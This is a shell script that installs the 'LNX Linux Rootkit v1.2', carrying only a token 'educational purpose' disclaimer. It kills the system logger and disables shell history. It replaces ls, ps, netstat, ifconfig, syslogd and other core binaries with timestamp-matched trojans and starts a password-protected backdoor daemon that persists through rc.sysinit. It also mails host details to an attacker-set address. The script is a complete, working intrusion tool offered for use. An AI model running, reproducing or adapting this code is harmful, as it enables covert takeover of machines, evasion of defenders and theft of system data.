#!/bin/sh
#
# .____     _______  ____  ___
# |    |    \      \ \   \/  /
# |    |    /   |   \ \     / 
# |    |___/    |    \/     \ 
# |_______ \____|__  /___/\  \
#         \/       \/      \_/ (c)
# 
# LNX Linux Rootkit v1.2 by m0rTaL
# 
# Use This For Educational Purpose Only
#
# The author is in no way responsible for damage made by irresponsible kiddiez and abusers
#
# Edit this or kit will not work properly !!!
#
# Proof of Concept

# Your email address
MAIL="YOUR_EMAIL@ADDRESS.COM"

# You don't need to edit anything

if test $# != 2  ; then
  echo "usage: $0 <pass> <port>"  
  exit
fi

BLACK="\033[0;30m"
BLUE="\033[0;34m"
LTBLUE="\033[1;34m"
WHITE="\033[1;37m"
RED="\033[0;31m"
LTRED="\033[1;31m"
GREEN="\033[0;32m"
LTGREEN="\033[1;32m"
PURPLE="\033[0;35m"
LTPURP="\033[1;35m"
YELLOW="\033[1;33m"
BROWN="\033[0;33m"
CYAN="\033[0;36m"
LTCYAN="\033[0;36m"
DKGREY="\033[1;30m"
LTGREY="\033[0;37m"
GRAY=$LTGREY
OFF="\033[0m"

VERSION="v1.2"
STARTTIME=`date +%s`
MYIP=`/sbin/ifconfig eth0 | grep "inet addr:" | awk -F ' ' ' {print $2} ' | cut -c6-`
PROC=`cat /proc/cpuinfo | grep model | grep name | awk '{printf $4 " " $5 " " $6}'``cat /proc/cpuinfo  | grep cpu | grep MHz | awk '{printf $4}'`
RDIR="/dev/lnx" 
CDIR=`pwd`
SYSLOGCONF="/etc/syslog.conf"
REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`
killall -q -9 syslogd > /dev/null

cp /root/.bash_profile "/root/.bash_profile "
echo "unset HISTFILE" >> /root/.bash_profile
echo "unset HISTSAVE" >> /root/.bash_profile

cd $CDIR
cat .banner

echo ""

echo "Backdooring started at   :`date +%l:%M:%S`"
 cd $CDIR
echo ""
echo "Backdoor Password        : $1"
echo "Backdoor Port            : $2"
echo ""

echo -en "${LTRED}Extracting bin.tgz: ${OFF}"
 tar xfz bin.tgz
 rm -rf bin.tgz
echo -e "${GREEN}DONE${OFF}"

if test -f /usr/bin/wget ; then
 cd $CDIR/bin
 rm -rf wget
 GET="/usr/bin/wget"
else
 mv -f $CDIR/bin/wget /usr/bin/
 chown root.root /usr/bin/wget
 GET="/usr/bin/wget"
fi

echo -e "${LTRED}Checking for rootkits: ${OFF}"

if test -d /dev/... ; then
 printf "${LTRED}*** WARNING ***${OFF} /dev/... dir exists - typical hacker dir\n"
fi

if test -d /bin/... ; then
 printf "${LTRED}*** WARNING ***${OFF} /bin/... dir exists - typical hacker dir\n"
fi

if test -f /bin/xlogin ; then
 printf "${LTRED}*** WARNING ***${OFF} /bin/xlogin exists - possible ulogin trojan\n"
fi

if test -f /sbin/xlogin ; then
 printf "${LTRED}*** WARNING ***${OFF} /sbin/xlogin exists - possible ulogin\n"
fi

if test -f /lib/ldlibps.so; then
 printf "${LTRED}*** WARNING ***${OFF} Uni-PS trojan by {MANIAC} could be install here\n"
fi

if test -d /usr/src/.puta ; then
 printf "${LTRED}*** WARNING ***${OFF} t0rnkit v7 or rip is already installed here\n"
 rm -rf /usr/sbin/nscd
 if test -f /etc/ttyhash ; then
   rm -rf /etc/ttyhash
 fi
 rm -rf /usr/info/.t0rn/
 rm -rf /usr/src/.puta/.1addr
 rm -rf /usr/src/.puta/.1proc
 rm -rf /ust/src/.puta/.1file
 rm -rf /usr/src/.puta/.1logs
 echo -e "${LTRED}Cleaning up rc.sysinit${OFF}"
 mkdir -p $RDIR/backup
 cp /etc/rc.sysinit $RDIR/backup/
 cat /etc/rc.d/rc.sysinit | grep -v "# Xntps (NTPv3 daemon) startup.." >> blaat;mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
 cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/xntps -q" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
 cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/nscd" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
 if test -f /etc/inetd.conf ; then
  cat /etc/inetd.conf | grep -v "6635" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
  cat /etc/inetd.conf | grep -v "9705" >> blaat; mv blaat /etc/inetd.conf;rm -rf blaat
  if test -f /usr/sbin/inetd ; then
        killall -q -9 inetd > /dev/null 
        /usr/sbin/inetd
  else
        killall -q -9 xinetd > /dev/null
        /usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
  fi
 fi
fi
  
if test -d /lib/ldd.so ; then
 if test -d /usr/lib/elm/ ; then
  printf "${LTRED}*** WARNING ***${OFF} BeastKit 7.0 X-0rg Edition or rip is already installed here\n"
  rm -rf /dev/srd0
  rm -rf /lib/libext-2.so.7
  rm -rf /lib/lblip.tk/
  rm -rf /usr/include/hosts.h
  rm -rf /usr/include/file.h
  rm -rf /usr/include/log.h 
  rm -rf /usr/include/proc.h
  cd /lib; rm -rf ldd.so
  killall -q -9 arobia > /dev/null
  rm -rf /usr/sbin/arobia
  rm -rf /usr/lib/elm
  echo -e "${LTRED}Cleaning up rc.sysinit${OFF}"  
  mkdir -p $RDIR/backup
  cp /etc/rc.sysinit $RDIR/backup/
  cat /etc/rc.d/rc.sysinit | grep -v "# Arobia daemon startup.." >> blaat;mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
  cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/arobia -q -p" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
  if test -f /etc/inetd.conf ; then
   cat /etc/inetd.conf | grep -v "6635" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
   cat /etc/inetd.conf | grep -v "9705" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
   if test -f /usr/sbin/inetd ; then
     killall -q -9 inetd
     /usr/sbin/inetd
   else
     killall -q -9 xinetd
     /usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
   fi
  fi
 else
  printf "${LTRED}*** WARNING ***${OFF} t0rnkit v8 or rip is already installed here\n"
  killall -9 -q xntps
  rm -rf /usr/sbin/xntpd
  rm -rf /dev/srd0
  rm -rf /lib/libext-2.so.7
  rm -rf /lib/lblip.tk/
  rm -rf /usr/include/hosts.h
  rm -rf /usr/include/file.h
  rm -rf /usr/include/log.h  
  rm -rf /usr/include/proc.h
  cd /lib; rm -rf ldd.so
  echo -e "${LTRED}Cleaning up rc.sysinit${OFF}"
  mkdir -p $RDIR/backup
  cp /etc/rc.sysinit $RDIR/backup/
  cat /etc/rc.d/rc.sysinit | grep -v "# Xntps (NTPv3 daemon) startup.." >> blaat;mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
  cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/xntps -q" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
  cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/nscd" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
  if test -f /etc/inetd.conf ; then
   cat /etc/inetd.conf | grep -v "6635" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
   cat /etc/inetd.conf | grep -v "9705" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
   if test -f /usr/sbin/inetd ; then
     killall -q -9 inetd
     /usr/sbin/inetd
   else
     killall -q -9 xinetd  
     /usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
   fi
  fi
 fi
fi

if test -d /dev/tux ; then
 printf "${LTRED}*** WARNING ***${OFF} Tuxtendo Linux Rootkit v1.0 is already installed here\n"
 rm -rf /dev/tux
 if test -f /usr/sbin/xntps ; then
   printf "${LTRED}*** WARNING ***${OFF} Tuxtendo Linux Rootkit v1.0 variant detected (w00pkit)\n"
    rm -rf /lib/libext-2.so.7
    rm -rf /lib/lblip.tk/
    killall -q -9 /usr/sbin/xntps
    killall -q -9 sniffer
    rm -rf /usr/sbin/xntps
    mkdir -p $RDIR/backup
    cp /etc/rc.sysinit $RDIR/backup/
    cat /etc/rc.d/rc.sysinit | grep -v "Staring Xntps Cache Deamon" >> blaat;mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
    cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/xntps -q" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
    cat /etc/rc.d/rc.sysinit | grep -v "/usr/sbin/nscd" >> blaat; mv blaat /etc/rc.d/rc.sysinit;rm -rf blaat
    if test -f /etc/inetd.conf ; then
     cat /etc/inetd.conf | grep -v "6635" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
     cat /etc/inetd.conf | grep -v "9705" >> blaat;mv blaat /etc/inetd.conf;rm -rf blaat
     if test -f /usr/sbin/inetd ; then
       killall -q -9 inetd
       /usr/sbin/inetd
     else
       killall -q -9 xinetd
       /usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
     fi
    fi
 fi
fi

if test -d /lib/security/.config ; then
printf "${LTRED}*** WARNING ***${OFF} X-Org Linux kit default dir found here\n"
fi

if test -d /usr/src/.poop ; then
printf "${LTRED}*** WARNING ***${OFF} RameN Worm is installed here\n"
fi

if test -f /dev/hda06 ; then
printf "${LTRED}*** WARNING ***${OFF} TeLeKiT telnetd trojan could be installed here\n"
fi

if test -d /usr/info/libc1.so ; then
printf "${LTRED}*** WARNING ***${OFF} TeLeKiT could be installed here\n"
fi

if test -d /dev/wd4  ; then
printf "${LTRED}*** WARNING ***${OFF} tribe default bot install dir here\n"
fi
  
if test -d /dev/portd ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/portd found, possible rootkit files\n"
fi
  
if test -f /dev/ptyy ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/ptyy found, possible rootkit files\n"
fi
  
if test -f /dev/ptyu ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/ptyu found, possible rootkit files\n"
fi

if test -f /dev/ptyq ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/ptyq found, possible rootkit files\n"
fi
  
if test -f /dev/ptyv ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/ptyv found, possible rootkit files\n"
fi
  
if test -f /dev/hdbb ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/hdbb found, possible rootkit files\n"
fi
  
if test -f /dev/mdev ; then
printf "${LTRED}*** WARNING ***${OFF} /dev/mdev found, possible Danny-Boy's Abuse Kit installed\n"
fi
  
if test -f /usr/share/.aPa ; then
printf "${LTRED}*** WARNING ***${OFF} /usr/share/.aPa found, possible aPa Kit installed\n"
fi

if test -d /usr/bin/duarawkz ; then
printf "${LTRED}*** WARNING ***${OFF} /usr/bin/duarawkz found, dua rootkit\n"
fi
  
if test -d /usr/bin/duarawkz/loginpass ; then
printf "${LTRED}*** WARNING ***${OFF} Password for dua rootkit `cat /usr/bin/duarawkz/loginpass` found\n"
fi

SYSACCTS="bin daemon adm lp sync shutdown halt mail news uucp operator games gopher ftp nobody xfs named gdm"

if test -f /etc/shadow ; then
        PASSFILE="/etc/shadow"
else    
        PASSFILE="/etc/passwd"
fi              
                
for acct in $SYSACCTS
do
        PASSCHR=`cat ${PASSFILE}|grep "${acct}:"|cut -d : -f 2|wc -c`
        if test ${PASSCHR} -gt 10 ; then
                printf "${LTRED}*** WARNING ***${OFF} System account ${acct} has a password set!\n"
        fi
done

echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED}Extracting conf.tgz: ${OFF}"
 cd $CDIR
 tar xfz conf.tgz
 rm -rf conf.tgz
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED}Extracting lib.tgz: ${OFF}"
 cd $CDIR
 tar xfz lib.tgz
 rm -rf lib.tgz
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED}Moving config files to ${RDIR}: ${OFF}"
 mkdir -p $RDIR
 cd $CDIR/conf  
 mv -f .addr $RDIR/.addr
 mv -f .cron $RDIR/.cron
 mv -f .file $RDIR/.file
 mv -f .log  $RDIR/.log
 mv -f .proc $RDIR/.proc
 mv -f .iface $RDIR/.iface
 cd $CDIR
 rm -rf conf
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED}Moving lib files to /lib: ${OFF}"
 cd $CDIR/lib  
 mv -f * /lib
 cd $CDIR
 rm -rf lib
 /sbin/ldconfig
echo -e "${GREEN}DONE${OFF}"
echo ""

echo -e "${LTRED}Backdooring:${OFF}"
 mkdir -p $RDIR/backup
 cd $CDIR/bin

echo -en "${LTRED} -Crontab: ${OFF}"  
 ./sz /usr/bin/crontab ./crontab
 touch -acmr /usr/bin/crontab ./crontab
 mv -f /usr/bin/crontab $RDIR/backup
 mv -f ./crontab /usr/bin/crontab
 chown root.root /usr/bin/crontab
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Df: ${OFF}"
 ./sz /bin/df ./df
 touch -acmr /bin/df ./df
 mv -f /bin/df $RDIR/backup
 mv -f ./df /bin/df
 chown root.root /bin/df
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Dir: ${OFF}"
 ./sz /usr/bin/dir ./dir
 touch -acmr /usr/bin/dir ./dir  
 mv -f /usr/bin/dir $RDIR/backup
 mv -f ./dir /usr/bin/dir
 chown root.root /usr/bin/dir
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Du: ${OFF}"
 ./sz /usr/bin/du ./du
 touch -acmr /usr/bin/du ./du
 mv -f /usr/bin/du $RDIR/backup
 mv -f ./du /usr/bin/du
 chown root.root /usr/bin/du
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Find: ${OFF}"
 ./sz /usr/bin/find ./find
 touch -acmr /usr/bin/find ./find
 mv -f /usr/bin/find $RDIR/backup
 mv -f ./find /usr/bin/find
 chown root.root /usr/bin/find
echo -e "${GREEN}DONE${OFF}"
 
echo -en "${LTRED} -Ifconfig: ${OFF}"
 ./sz /sbin/ifconfig ./ifconfig
 touch -acmr /sbin/ifconfig ./ifconfig
 mv -f /sbin/ifconfig $RDIR/backup
 mv -f ./ifconfig /sbin/ifconfig
 chown root.root /sbin/ifconfig
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Killall: ${OFF}"
 ./sz /usr/bin/killall ./killall
 touch -acmr /usr/bin/killall ./killall
 mv -f /usr/bin/killall $RDIR/backup
 mv -f ./killall /usr/bin/killall
 chown root.root /usr/bin/killall
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Locate: ${OFF}"
 ./sz /usr/bin/locate ./locate  
 touch -acmr /usr/bin/locate ./locate
 mv -f /usr/bin/locate $RDIR/backup
 mv -f ./locate /usr/bin/locate
 chown root.root /usr/bin/locate
echo -e "${GREEN}DONE${OFF}" 

echo -en "${LTRED} -Ls: ${OFF}"
 ./sz /bin/ls ./ls
 touch -acmr /bin/ls ./ls
 mv -f /bin/ls $RDIR/backup
 mv -f ./ls /bin/ls
 chown root.root /bin/ls
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Netstat: ${OFF}"
 ./sz /bin/netstat ./netstat   
 touch -acmr /bin/netstat ./netstat
 mv -f /bin/netstat $RDIR/backup
 mv -f ./netstat /bin/netstat
 chown root.root /bin/netstat
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Ps: ${OFF}"
 ./sz /bin/ps ./ps 
 touch -acmr /bin/ps ./ps
 mv -f /bin/ps $RDIR/backup
 mv -f ./ps /bin/ps
 chown root.root /bin/ps
echo -e "${GREEN}DONE${OFF}"
 
echo -en "${LTRED} -Pstree: ${OFF}"
 ./sz /usr/bin/pstree ./pstree
 touch -acmr /usr/bin/pstree ./pstree
 mv -f /usr/bin/pstree $RDIR/backup
 mv -f ./pstree /usr/bin/pstree
 chown root.root /usr/bin/pstree
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Syslogd: ${OFF}"
if test -f /usr/sbin/syslogd  ; then
        ./sz /usr/sbin/syslogd ./syslogd
        touch -acmr /usr/sbin/syslogd ./syslogd
        mv -f /usr/sbin/syslogd $RDIR/backup
        mv -f ./syslogd /usr/sbin/syslogd
        chown root.root /usr/sbin/syslogd
 
else
        ./sz /sbin/syslogd ./syslogd
        touch -acmr /sbin/syslogd ./syslogd
        mv -f /sbin/syslogd $RDIR/backup
        mv -f ./syslogd /sbin/syslogd
        chown root.root /sbin/syslogd   
fi
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Tcpd: ${OFF}"
 ./sz /usr/sbin/tcpd ./tcpd
 touch -acmr /usr/sbin/tcpd ./tcpd
 mv -f /usr/sbin/tcpd $RDIR/backup
 mv -f ./tcpd /usr/sbin/tcpd
 chown root.root /usr/sbin/tcpd
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Top: ${OFF}"
 ./sz /usr/bin/top ./top
 touch -acmr /usr/bin/top ./top
 mv -f /usr/bin/top $RDIR/backup
 mv -f ./top /usr/bin/top
 chown root.root /usr/bin/top
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED} -Updatedb: ${OFF}"
 ./sz /usr/bin/updatedb ./updatedb
 touch -acmr /usr/bin/updatedb ./updatedb
 mv -f /usr/bin/updatedb $RDIR/backup
 mv -f ./updatedb /usr/bin/updatedb
 chown root.root /usr/bin/updatedb
echo -e "${GREEN}DONE${OFF}" 

echo -en "${LTRED} -Vdir: ${OFF}"
 ./sz /usr/bin/vdir ./vdir
 touch -acmr /usr/bin/vdir ./vdir
 mv -f /usr/bin/vdir $RDIR/backup
 mv -f ./vdir /usr/bin/vdir
 chown root.root /usr/bin/vdir
echo -e "${GREEN}DONE${OFF}"

rm -rf $CDIR/bin/sz

echo -en "${LTRED}Installing Arobia Daemon: ${OFF}"
  cd $CDIR
  mkdir -p /usr/lib/elm/
  echo "3 $2" >> $RDIR/.addr
  mv -f $CDIR/bin/encrypt $RDIR/
  mv arobia.tgz /usr/lib/elm
  cd /usr/lib/elm
  tar xfz arobia.tgz 
  rm -rf arobia.tgz
  mv -f /usr/lib/elm/arobia/elm/arobia /usr/sbin/
  echo "$MYIP $1 $2" > /usr/lib/elm/arobia/elm/arobia.conf
  mv -f /usr/lib/elm/arobia/elm/arobia.conf /etc/
  /usr/sbin/arobia
  cd /usr/lib/elm/arobia
  sed s/08e7592e361de6fd59d4d126b29fe6ea/`md5sum --string=$1|awk '{print $1}'`/g elm\  > arobia
  killall -q -9 xntps > /dev/null
  chmod +rwx arobia
  mv -f arobia /usr/sbin/
  chown root.root /usr/sbin/arobia
  /usr/sbin/arobia -q -p $2
  cp /etc/rc.sysinit $RDIR/backup/
  cp /etc/rc.sysinit "/etc/rc.sysinit "
  echo "# Arobia daemon startup.." >> /etc/rc.d/rc.sysinit
  echo "/usr/sbin/arobia -q -p $2" >> /etc/rc.d/rc.sysinit
echo -e "${GREEN}DONE${OFF}"

echo -en "${LTRED}Installing Idrun: ${OFF}"
  cd $CDIR/bin
  mv -f idrun /usr/sbin/
  /usr/sbin/idrun
echo -e "${GREEN}DONE${OFF}"

ENDTIME=`date +%s`
DONETIME=`expr $ENDTIME - $STARTTIME`
echo ""
echo -e "${LTRED}Backdoored in $DONETIME seconds${OFF}"

echo ""
echo -en "${LTRED}Moving what's left to ${RDIR}: ${OFF}"
 cd $CDIR/bin
 mv -f * $RDIR/
echo -e "${GREEN}DONE${OFF}"

echo ""
echo -en "${LTRED}Cleaning up: ${OFF}"
 cd $CDIR
 cd ..
 rm -rf $CDIR
 rm -rf lnx*
echo -e "${GREEN}DONE${OFF}"

FREE=`df |grep dev |awk '{printf $4 "\n"}'`
x="0"
for i in $FREE
  do
    x=`expr $x + $i`
  done
FREESPACE=`expr $x / 1024`

TOTAL=`df |grep dev |awk '{printf $2 "\n"}'`
x="0"
for i in $TOTAL
  do
    x=`expr $x + $i`
  done
TOTALSPACE=`expr $x / 1024`

echo ""
echo -e " System information"
echo -e "  Hostname     : `hostname -f`"
echo -e "  IP address   : $MYIP `hostname -i`"
echo -e "  Alt IPs      : `/sbin/ifconfig | grep eth | wc -l`"
echo -e "  Processor    : $PROC"   
echo -e "  Bogomips     : `cat /proc/cpuinfo | grep bogomips | awk '{printf $3}'`"
echo -e "  Disckspace   : ${FREESPACE}/${TOTALSPACE} MB"
echo ""

if test -f /usr/sbin/syslogd  ; then
        /usr/sbin/syslogd -m 0
else
        /sbin/syslogd -m 0 
fi

echo -en "${LTRED}Mailing Rootlist: ${OFF}"
    cd $RDIR
    ./info $1 $2 |mail -s "LNX 0wnz" $MAIL
    rm -rf info
echo -e "${GREEN}DONE${OFF}"

echo "[+] GreEtz to all the Brotherz from the scene [+]"
echo "EOF"
